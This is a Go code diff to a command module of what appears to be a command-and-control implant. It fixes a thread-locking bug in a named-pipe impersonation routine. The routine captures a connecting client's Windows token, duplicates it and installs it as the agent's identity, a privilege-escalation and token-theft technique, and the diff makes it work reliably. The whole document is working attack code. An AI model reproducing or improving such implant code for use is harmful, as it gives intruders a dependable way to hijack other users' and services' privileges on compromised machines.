@@ -6,6 +6,7 @@ package commands
 import (
 	"encoding/json"
 	"fmt"
+	"runtime"
 	"strings"
 	"time"
 	"unsafe"
@@ -286,9 +287,17 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 		}
 	}
 
+	// Lock goroutine to OS thread for the entire impersonation sequence.
+	// ImpersonateNamedPipeClient sets the token on the current OS thread,
+	// and Go's scheduler can migrate goroutines between threads at any point.
+	// Without LockOSThread, OpenThreadToken may run on a different thread
+	// and fail with ERROR_NO_TOKEN (1008).
+	runtime.LockOSThread()
+
 	// Client connected — impersonate
 	ret, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
 	if ret == 0 {
+		runtime.UnlockOSThread()
 		procDisconnectNamedPipe.Call(hPipe)
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("ImpersonateNamedPipeClient failed: %v\nThis usually means SeImpersonatePrivilege is not available.", impErr),
@@ -314,6 +323,7 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 	if err != nil {
 		// Revert since we can't capture the token
 		procRevertToSelf.Call()
+		runtime.UnlockOSThread()
 		procDisconnectNamedPipe.Call(hPipe)
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Client connected as %s but failed to capture thread token: %v", clientIdentity, err),
@@ -347,6 +357,7 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 
 	if err != nil {
 		procRevertToSelf.Call()
+		runtime.UnlockOSThread()
 		procDisconnectNamedPipe.Call(hPipe)
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Client connected as %s but DuplicateTokenEx failed: %v", clientIdentity, err),
@@ -359,8 +370,9 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 	procRevertToSelf.Call()
 	procDisconnectNamedPipe.Call(hPipe)
 
-	// Store the token in the global identity system (like steal-token)
+	// Store the token in the global identity system (calls ImpersonateLoggedOnUser on this thread)
 	if setErr := SetIdentityToken(dupToken); setErr != nil {
+		runtime.UnlockOSThread()
 		windows.CloseHandle(windows.Handle(dupToken))
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Client connected as %s but SetIdentityToken failed: %v", clientIdentity, setErr),
@@ -368,6 +380,9 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 			Completed: true,
 		}
 	}
+
+	// Mark as thread-locked so PrepareExecution doesn't double-lock
+	osThreadLocked = true
 
 	var sb strings.Builder
 	sb.WriteString("=== PIPE IMPERSONATION SUCCESS ===\n\n")
